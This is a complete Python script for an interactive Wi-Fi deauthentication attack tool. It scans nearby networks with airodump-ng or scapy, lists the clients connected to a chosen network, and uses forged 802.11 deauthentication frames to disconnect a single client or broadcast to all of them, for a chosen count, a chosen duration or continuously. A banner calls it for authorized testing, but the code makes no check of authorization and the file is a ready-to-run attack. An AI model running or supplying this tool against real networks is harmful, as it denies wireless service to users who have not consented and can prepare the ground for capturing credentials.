#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import threading
import signal
from datetime import datetime
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Elt
import argparse
import json
import re
from typing import List, Dict, Optional, Tuple
import csv

# Global variables
selected_interface = "wlan0"  # Default interface
selected_network = None
selected_client = None
scan_results = []
clients_list = []
running = True
log_file = "wifi_deauth_log.csv"

class Logger:
    def __init__(self, log_file: str = "wifi_deauth_log.csv"):
        self.log_file = log_file
        self.ensure_log_file()
    
    def ensure_log_file(self):
        """Create log file with headers if it doesn't exist"""
        if not os.path.exists(self.log_file):
            with open(self.log_file, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Timestamp', 'Action', 'Interface', 'BSSID', 'ESSID', 
                               'Client_MAC', 'Channel', 'Duration', 'Status'])
    
    def log(self, action: str, interface: str = "", bssid: str = "", essid: str = "", 
            client_mac: str = "", channel: str = "", duration: str = "", status: str = ""):
        """Log an action to the CSV file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(self.log_file, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([timestamp, action, interface, bssid, essid, 
                           client_mac, channel, duration, status])
        
        print(f"[LOG] {timestamp} - {action}: {status}")

logger = Logger(log_file)

def check_root():
    """Check if script is running as root"""
    if os.geteuid() != 0:
        print("This script requires root privileges!")
        print("Please run with sudo.")
        sys.exit(1)

def check_interface(interface: str) -> bool:
    """Check if interface exists and is in monitor mode"""
    try:
        result = subprocess.run(['iwconfig', interface], 
                              capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            return True
        return False
    except:
        return False

def set_monitor_mode(interface: str) -> bool:
    """Set wireless interface to monitor mode"""
    try:
        # Bring interface down
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
        # Set monitor mode
        subprocess.run(['iwconfig', interface, 'mode', 'monitor'], check=True)
        # Bring interface up
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
        return True
    except Exception as e:
        print(f"Error setting monitor mode: {e}")
        return False

def scan_networks(interface: str) -> List[Dict]:
    """Scan for nearby Wi-Fi networks"""
    print(f"Scanning for networks on {interface}...")
    
    networks = []
    try:
        # Use airodump-ng to scan networks
        cmd = ['airodump-ng', '--output-format', 'csv', '--write', '/tmp/scan', interface]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Let it scan for 5 seconds
        time.sleep(5)
        process.send_signal(signal.SIGINT)
        process.wait()
        
        # Read the CSV file
        csv_file = '/tmp/scan-01.csv'
        if os.path.exists(csv_file):
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            # Find where networks start and clients start
            network_lines = []
            for i, line in enumerate(lines):
                if line.startswith('BSSID,'):
                    network_lines = lines[i+1:]
                    break
            
            for line in network_lines:
                if line.strip() and not line.startswith('Station MAC,'):
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        essid = parts[13].strip()
                        
                        if bssid and essid and channel:
                            networks.append({
                                'BSSID': bssid,
                                'Channel': channel,
                                'ESSID': essid
                            })
        
        # Clean up
        if os.path.exists(csv_file):
            os.remove(csv_file)
        
    except Exception as e:
        print(f"Error scanning networks: {e}")
        print("Trying alternative scanning method...")
        networks = scan_with_scapy(interface)
    
    return networks

def scan_with_scapy(interface: str) -> List[Dict]:
    """Alternative scan using scapy"""
    networks = []
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            essid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore') if pkt[Dot11Elt].info else "<hidden>"
            
            # Extract channel from DS Parameter Set
            channel = None
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 3:  # DS Parameter Set
                        channel = str(elt.info[0])
                        break
                    elt = elt.payload
            
            if bssid and (essid != "<hidden>" or channel):
                network = {
                    'BSSID': bssid,
                    'ESSID': essid,
                    'Channel': channel or 'Unknown'
                }
                if network not in networks:
                    networks.append(network)
    
    print("Scanning with scapy (press Ctrl+C after 5-10 seconds)...")
    try:
        sniff(iface=interface, prn=packet_handler, timeout=10)
    except KeyboardInterrupt:
        pass
    
    return networks

def select_network(interface: str, bssid: str, channel: str) -> List[Dict]:
    """Select a network and scan for connected clients"""
    print(f"Scanning for clients on network {bssid} on channel {channel}...")
    
    clients = []
    try:
        # Set channel
        subprocess.run(['iwconfig', interface, 'channel', channel], check=True)
        
        # Use airodump-ng to scan for clients
        cmd = ['airodump-ng', '--bssid', bssid, '--channel', channel,
               '--output-format', 'csv', '--write', '/tmp/client_scan', interface]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Let it scan for 10 seconds
        time.sleep(10)
        process.send_signal(signal.SIGINT)
        process.wait()
        
        # Read the CSV file
        csv_file = '/tmp/client_scan-01.csv'
        if os.path.exists(csv_file):
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            # Find where clients start
            client_lines = []
            for i, line in enumerate(lines):
                if line.startswith('Station MAC,'):
                    client_lines = lines[i+1:]
                    break
            
            for line in client_lines:
                if line.strip():
                    parts = line.split(',')
                    if len(parts) >= 6:
                        client_mac = parts[0].strip()
                        if client_mac:
                            clients.append({
                                'MAC': client_mac,
                                'BSSID': bssid
                            })
        
        # Clean up
        if os.path.exists(csv_file):
            os.remove(csv_file)
            
    except Exception as e:
        print(f"Error scanning clients: {e}")
    
    return clients

def deauth_client(interface: str, bssid: str, client_mac: str, 
                  count: int = 0, duration: int = 0) -> threading.Thread:
    """Deauthenticate a specific client"""
    def deauth_thread():
        packets_sent = 0
        start_time = time.time()
        
        # Create deauthentication packet
        # Packet 1: From AP to client
        packet1 = RadioTap() / \
                 Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / \
                 Dot11Deauth(reason=7)
        
        # Packet 2: From client to AP
        packet2 = RadioTap() / \
                 Dot11(addr1=bssid, addr2=client_mac, addr3=bssid) / \
                 Dot11Deauth(reason=7)
        
        try:
            if duration > 0:
                # Send for specified duration
                while (time.time() - start_time) < duration and running:
                    sendp(packet1, iface=interface, count=1, verbose=0)
                    sendp(packet2, iface=interface, count=1, verbose=0)
                    packets_sent += 2
                    time.sleep(0.1)
            elif count > 0:
                # Send specified number of packets
                for _ in range(count):
                    if not running:
                        break
                    sendp(packet1, iface=interface, count=1, verbose=0)
                    sendp(packet2, iface=interface, count=1, verbose=0)
                    packets_sent += 2
                    time.sleep(0.1)
            else:
                # Continuous sending (until stopped)
                while running:
                    sendp(packet1, iface=interface, count=1, verbose=0)
                    sendp(packet2, iface=interface, count=1, verbose=0)
                    packets_sent += 2
                    time.sleep(0.1)
            
            print(f"Deauth attack completed. Packets sent: {packets_sent}")
            logger.log("Deauth_Client", interface, bssid, "", client_mac, "", 
                      f"{duration}s" if duration > 0 else f"{count}pkts", 
                      f"Completed - {packets_sent} packets")
            
        except Exception as e:
            print(f"Error during deauth: {e}")
            logger.log("Deauth_Client", interface, bssid, "", client_mac, "", 
                      f"{duration}s" if duration > 0 else f"{count}pkts", f"Error: {e}")
    
    thread = threading.Thread(target=deauth_thread)
    thread.daemon = True
    thread.start()
    return thread

def deauth_all(interface: str, bssid: str, channel: str,
               count: int = 0, duration: int = 0) -> threading.Thread:
    """Deauthenticate all clients from a network"""
    def broadcast_deauth_thread():
        packets_sent = 0
        start_time = time.time()
        
        # Broadcast deauth packet
        packet = RadioTap() / \
                Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / \
                Dot11Deauth(reason=7)
        
        try:
            # Set channel
            subprocess.run(['iwconfig', interface, 'channel', channel], check=True)
            
            if duration > 0:
                # Send for specified duration
                while (time.time() - start_time) < duration and running:
                    sendp(packet, iface=interface, count=1, verbose=0)
                    packets_sent += 1
                    time.sleep(0.1)
            elif count > 0:
                # Send specified number of packets
                for _ in range(count):
                    if not running:
                        break
                    sendp(packet, iface=interface, count=1, verbose=0)
                    packets_sent += 1
                    time.sleep(0.1)
            else:
                # Continuous sending (until stopped)
                while running:
                    sendp(packet, iface=interface, count=1, verbose=0)
                    packets_sent += 1
                    time.sleep(0.1)
            
            print(f"Broadcast deauth completed. Packets sent: {packets_sent}")
            logger.log("Deauth_All", interface, bssid, "", "", channel,
                      f"{duration}s" if duration > 0 else f"{count}pkts", 
                      f"Completed - {packets_sent} packets")
            
        except Exception as e:
            print(f"Error during broadcast deauth: {e}")
            logger.log("Deauth_All", interface, bssid, "", "", channel,
                      f"{duration}s" if duration > 0 else f"{count}pkts", f"Error: {e}")
    
    thread = threading.Thread(target=broadcast_deauth_thread)
    thread.daemon = True
    thread.start()
    return thread

def display_networks(networks: List[Dict]):
    """Display networks in a formatted table"""
    print("\n" + "="*80)
    print(f"{'#':<3} {'BSSID':<20} {'Channel':<10} {'ESSID':<30}")
    print("="*80)
    
    for i, network in enumerate(networks, 1):
        print(f"{i:<3} {network['BSSID']:<20} {network['Channel']:<10} {network['ESSID'][:30]:<30}")
    print("="*80)

def display_clients(clients: List[Dict]):
    """Display clients in a formatted table"""
    print("\n" + "="*50)
    print(f"{'#':<3} {'Client MAC':<20}")
    print("="*50)
    
    for i, client in enumerate(clients, 1):
        print(f"{i:<3} {client['MAC']:<20}")
    print("="*50)

def check_adapter_status():
    """Check Wi-Fi adapter status"""
    print(f"\nChecking adapter status for {selected_interface}...")
    
    try:
        # Check if interface exists
        result = subprocess.run(['ip', 'link', 'show', selected_interface],
                              capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"Interface {selected_interface} not found!")
            return
        
        print(f"\nInterface: {selected_interface}")
        print("-" * 40)
        
        # Get MAC address
        result = subprocess.run(['ip', 'link', 'show', selected_interface],
                              capture_output=True, text=True)
        mac_match = re.search(r'link/ether ([\da-f:]+)', result.stdout)
        if mac_match:
            print(f"MAC Address: {mac_match.group(1)}")
        
        # Check mode
        result = subprocess.run(['iwconfig', selected_interface],
                              capture_output=True, text=True)
        
        mode_match = re.search(r'Mode:(\S+)', result.stdout)
        if mode_match:
            print(f"Mode: {mode_match.group(1)}")
        
        channel_match = re.search(r'Channel (\d+)', result.stdout)
        if channel_match:
            print(f"Channel: {channel_match.group(1)}")
        
        frequency_match = re.search(r'Frequency:(\d+\.\d+) GHz', result.stdout)
        if frequency_match:
            print(f"Frequency: {frequency_match.group(1)} GHz")
        
        # Check if monitor mode is supported
        result = subprocess.run(['iw', 'list'],
                              capture_output=True, text=True)
        if "monitor" in result.stdout.lower():
            print("Monitor Mode: Supported")
        else:
            print("Monitor Mode: Not Supported")
        
        logger.log("Check_Adapter", selected_interface, status="Completed")
        
    except Exception as e:
        print(f"Error checking adapter status: {e}")
        logger.log("Check_Adapter", selected_interface, status=f"Error: {e}")

def change_interface():
    """Change the wireless interface name"""
    global selected_interface
    
    print(f"\nCurrent interface: {selected_interface}")
    print("Available wireless interfaces:")
    
    try:
        result = subprocess.run(['ip', 'link', 'show'],
                              capture_output=True, text=True)
        
        interfaces = []
        for line in result.stdout.split('\n'):
            if 'wlan' in line or 'wlp' in line or 'wifi' in line.lower():
                if_match = re.search(r'^\d+: (\w+):', line)
                if if_match:
                    interfaces.append(if_match.group(1))
        
        if not interfaces:
            print("No wireless interfaces found!")
            return
        
        for i, iface in enumerate(interfaces, 1):
            print(f"{i}. {iface}")
        
        choice = input(f"\nSelect interface (1-{len(interfaces)}) or enter new name: ").strip()
        
        if choice.isdigit() and 1 <= int(choice) <= len(interfaces):
            selected_interface = interfaces[int(choice)-1]
        else:
            selected_interface = choice
        
        print(f"Interface changed to: {selected_interface}")
        
        # Verify interface exists
        if check_interface(selected_interface):
            print("Interface verified.")
            if not check_interface(selected_interface):  # Check if in monitor mode
                print("Setting to monitor mode...")
                if set_monitor_mode(selected_interface):
                    print("Monitor mode set successfully!")
                else:
                    print("Failed to set monitor mode!")
        else:
            print(f"Warning: Interface {selected_interface} may not exist or be in monitor mode")
        
        logger.log("Change_Interface", selected_interface, status="Changed")
        
    except Exception as e:
        print(f"Error changing interface: {e}")
        logger.log("Change_Interface", selected_interface, status=f"Error: {e}")

def stop_all_attacks():
    """Stop all running attacks"""
    global running
    running = False
    print("\nStopping all attacks...")
    time.sleep(1)  # Give threads time to stop
    running = True  # Reset for next attacks

def main():
    global selected_network, selected_client, scan_results, clients_list, running
    
    check_root()
    
    print("="*60)
    print("Wi-Fi Deauthentication Tool")
    print("For educational and authorized testing only!")
    print("="*60)
    print(f"Using interface: {selected_interface}")
    print(f"Log file: {log_file}")
    print("="*60)
    
    # Check if interface is in monitor mode
    if not check_interface(selected_interface):
        print(f"Interface {selected_interface} is not in monitor mode.")
        choice = input("Set to monitor mode? (y/n): ").lower()
        if choice == 'y':
            if set_monitor_mode(selected_interface):
                print("Monitor mode set successfully!")
            else:
                print("Failed to set monitor mode. Exiting.")
                return
    
    while True:
        print("\n" + "="*60)
        print("MAIN MENU")
        print("="*60)
        print("1. Scan for Wi-Fi networks")
        print("2. Select a Wi-Fi network for further actions")
        print("3. Deauthenticate a client from a Wi-Fi network")
        print("4. Deauthenticate all clients from a Wi-Fi network")
        print("5. Check Wi-Fi Adapter Status")
        print("6. Change Wi-Fi Adapter Interface Name")
        print("7. View Log File")
        print("8. Stop All Running Attacks")
        print("9. Exit")
        print("="*60)
        
        choice = input("Select an option (1-9): ").strip()
        
        if choice == '1':
            # Scan for networks
            scan_results = scan_networks(selected_interface)
            
            if scan_results:
                display_networks(scan_results)
                logger.log("Network_Scan", selected_interface, status=f"Found {len(scan_results)} networks")
                
                # Option to save scan results
                save_choice = input("\nSave scan results to file? (y/n): ").lower()
                if save_choice == 'y':
                    filename = f"scan_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    with open(filename, 'w') as f:
                        f.write("BSSID,Channel,ESSID\n")
                        for network in scan_results:
                            f.write(f"{network['BSSID']},{network['Channel']},{network['ESSID']}\n")
                    print(f"Scan results saved to {filename}")
            else:
                print("No networks found!")
                logger.log("Network_Scan", selected_interface, status="No networks found")
        
        elif choice == '2':
            # Select a network
            if not scan_results:
                print("Please scan for networks first (Option 1)!")
                continue
            
            display_networks(scan_results)
            
            try:
                net_choice = int(input(f"\nSelect network (1-{len(scan_results)}): "))
                if 1 <= net_choice <= len(scan_results):
                    selected_network = scan_results[net_choice-1]
                    print(f"\nSelected Network:")
                    print(f"BSSID: {selected_network['BSSID']}")
                    print(f"Channel: {selected_network['Channel']}")
                    print(f"ESSID: {selected_network['ESSID']}")
                    
                    # Scan for clients on this network
                    clients_list = select_network(selected_interface, 
                                                 selected_network['BSSID'],
                                                 selected_network['Channel'])
                    
                    if clients_list:
                        display_clients(clients_list)
                        logger.log("Client_Scan", selected_interface, 
                                 selected_network['BSSID'], selected_network['ESSID'],
                                 status=f"Found {len(clients_list)} clients")
                    else:
                        print("No clients found on this network!")
                        logger.log("Client_Scan", selected_interface,
                                 selected_network['BSSID'], selected_network['ESSID'],
                                 status="No clients found")
                else:
                    print("Invalid selection!")
            except ValueError:
                print("Please enter a valid number!")
        
        elif choice == '3':
            # Deauthenticate a specific client
            if not selected_network:
                print("Please select a network first (Option 2)!")
                continue
            
            if not clients_list:
                print("No clients found on this network!")
                continue
            
            display_clients(clients_list)
            
            try:
                client_choice = int(input(f"\nSelect client to deauth (1-{len(clients_list)}): "))
                if 1 <= client_choice <= len(clients_list):
                    selected_client = clients_list[client_choice-1]
                    
                    print(f"\nSelected Client:")
                    print(f"MAC: {selected_client['MAC']}")
                    print(f"Network: {selected_network['ESSID']} ({selected_network['BSSID']})")
                    
                    print("\nDeauth Options:")
                    print("1. Send specific number of packets")
                    print("2. Send for specific duration (seconds)")
                    print("3. Continuous (until stopped)")
                    
                    deauth_choice = input("Select option (1-3): ").strip()
                    
                    if deauth_choice == '1':
                        count = int(input("Number of packets to send (each direction): "))
                        print(f"\nStarting deauth attack on {selected_client['MAC']}...")
                        print("Press Ctrl+C in the menu to stop")
                        deauth_client(selected_interface, selected_network['BSSID'],
                                     selected_client['MAC'], count=count)
                        
                    elif deauth_choice == '2':
                        duration = int(input("Duration in seconds: "))
                        print(f"\nStarting deauth attack on {selected_client['MAC']} for {duration} seconds...")
                        deauth_client(selected_interface, selected_network['BSSID'],
                                     selected_client['MAC'], duration=duration)
                        
                    elif deauth_choice == '3':
                        print(f"\nStarting continuous deauth attack on {selected_client['MAC']}...")
                        print("Use Option 8 to stop the attack")
                        deauth_client(selected_interface, selected_network['BSSID'],
                                     selected_client['MAC'])
                        
                    else:
                        print("Invalid choice!")
                        
                else:
                    print("Invalid selection!")
            except ValueError:
                print("Please enter a valid number!")
        
        elif choice == '4':
            # Deauthenticate all clients
            if not selected_network:
                print("Please select a network first (Option 2)!")
                continue
            
            print(f"\nNetwork: {selected_network['ESSID']} ({selected_network['BSSID']})")
            print(f"Channel: {selected_network['Channel']}")
            
            print("\nDeauth Options:")
            print("1. Send specific number of packets")
            print("2. Send for specific duration (seconds)")
            print("3. Continuous (until stopped)")
            
            deauth_choice = input("Select option (1-3): ").strip()
            
            if deauth_choice == '1':
                count = int(input("Number of packets to send: "))
                print(f"\nStarting broadcast deauth attack on all clients...")
                print("Press Ctrl+C in the menu to stop")
                deauth_all(selected_interface, selected_network['BSSID'],
                          selected_network['Channel'], count=count)
                
            elif deauth_choice == '2':
                duration = int(input("Duration in seconds: "))
                print(f"\nStarting broadcast deauth attack for {duration} seconds...")
                deauth_all(selected_interface, selected_network['BSSID'],
                          selected_network['Channel'], duration=duration)
                
            elif deauth_choice == '3':
                print(f"\nStarting continuous broadcast deauth attack...")
                print("Use Option 8 to stop the attack")
                deauth_all(selected_interface, selected_network['BSSID'],
                          selected_network['Channel'])
                
            else:
                print("Invalid choice!")
        
        elif choice == '5':
            # Check adapter status
            check_adapter_status()
        
        elif choice == '6':
            # Change interface
            change_interface()
        
        elif choice == '7':
            # View log file
            if os.path.exists(log_file):
                print(f"\nContents of {log_file}:")
                print("="*100)
                with open(log_file, 'r') as f:
                    reader = csv.reader(f)
                    for i, row in enumerate(reader):
                        if i == 0:  # Header
                            print(f"{'Timestamp':<20} {'Action':<15} {'Interface':<10} {'BSSID':<18} {'ESSID':<20} {'Client':<18} {'Status':<30}")
                            print("-"*100)
                        else:
                            if len(row) >= 9:
                                print(f"{row[0]:<20} {row[1]:<15} {row[2]:<10} {row[3]:<18} {row[4][:20]:<20} {row[5][:17]:<18} {row[8][:30]:<30}")
                print("="*100)
                
                # Option to clear log
                clear_choice = input("\nClear log file? (y/n): ").lower()
                if clear_choice == 'y':
                    logger.ensure_log_file()  # This recreates with headers only
                    print("Log file cleared!")
            else:
                print("Log file not found!")
        
        elif choice == '8':
            # Stop all attacks
            stop_all_attacks()
        
        elif choice == '9':
            # Exit
            stop_all_attacks()
            print("\nThank you for using Wi-Fi Deauthentication Tool!")
            print("Remember: Use only for authorized testing!")
            print("Exiting...")
            break
        
        else:
            print("Invalid option! Please select 1-9.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nInterrupted by user. Stopping all attacks...")
        stop_all_attacks()
        print("Exiting...")
    except Exception as e:
        print(f"\nUnexpected error: {e}")
        logger.log("System_Error", "", status=f"Unexpected error: {e}")